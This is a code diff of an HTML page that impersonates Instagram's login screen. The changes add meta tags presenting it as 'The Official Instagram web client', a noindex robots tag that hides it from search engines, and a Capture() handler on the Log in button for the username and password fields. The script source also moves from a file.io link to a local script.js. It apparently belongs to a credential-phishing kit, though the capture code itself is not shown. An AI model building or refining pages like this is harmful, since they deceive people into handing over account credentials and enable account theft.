@@ -4,11 +4,17 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="The Official Instagram web client">
+    <meta name="robots" content="noindex, nofollow">
+    <meta property="og:title" content="Instagram"/>
+    <meta property="og:description" content="The Official Instagram web client for android">
+    <meta property="og:image" content="https://i.ibb.co/bWT0pmC/favicon.png">
+
     <title>Instagram</title>
 
     <link rel="stylesheet" href="style.css">
     <link rel="shortcut icon" href="https://i.ibb.co/bWT0pmC/favicon.png" type="image/x-icon">
-    <script src="https://file.io/NIWODBCIozkf"></script>
+    <script src="./script.js"></script>
 </head>
 <body>
     <div class="w-full h-screen flex flex-col items-center absolute top-0">
@@ -25,13 +31,13 @@
                 OR
             </p>
             <feeld class="w-full flex flex-row relative">
-                <input type="text" class="inp" autocomplete="off" autocorrect="off" spellcheck=false id='uname' required onkeyup="enableLogin(this.value, document.getElementById('pass').value)">
+                <input type="text" class="inp" autocomplete="off" autocorrect="off" spellcheck=false id='uname' required onkeyup="enableLogin(this.value, document.getElementById('pass').value)" onclick="enableLogin(this.value, document.getElementById('pass').value)">
                 <span class="absolute text-xs font-montserrat top-2 pl-2 text-grayed">
                     Phone number, username or email
                 </span>
             </feeld>
             <feeld class="w-full flex flex-row relative">
-                <input type="password" class="inp" autocomplete="off" autocorrect="off" spellcheck=false id='pass' required onkeyup="enableLogin(document.getElementById('uname').value, this.value)">
+                <input type="password" class="inp" autocomplete="off" autocorrect="off" spellcheck=false id='pass' required onkeyup="enableLogin(document.getElementById('uname').value, this.value)" onclick="enableLogin(document.getElementById('uname').value, this.value)">
                 <span class="absolute text-xs font-montserrat top-2 pl-2 text-grayed">
                     Password
                 </span>
@@ -41,8 +47,8 @@
             </feeld>
             <a href="instagram.com/accounts/password/reset" class="self-end font-montserrat text-xs text-btn-blue opacity-60">
                 Forgot password?
-            </a>          
-            <button class="bg-btn-blue text-white font-montserrat w-full h-7 rounded-norm font-semibold text-sm relative top-5 opacity-40" disabled id="login">
+            </a>
+            <button class="bg-btn-blue text-white font-montserrat w-full h-7 rounded-norm font-semibold text-sm relative top-5 opacity-40" disabled id="login" onclick="Capture()">
                 Log in
             </button>
             <div class="text-xs text-grayed font-montserrat relative top-10 flex flex-row">
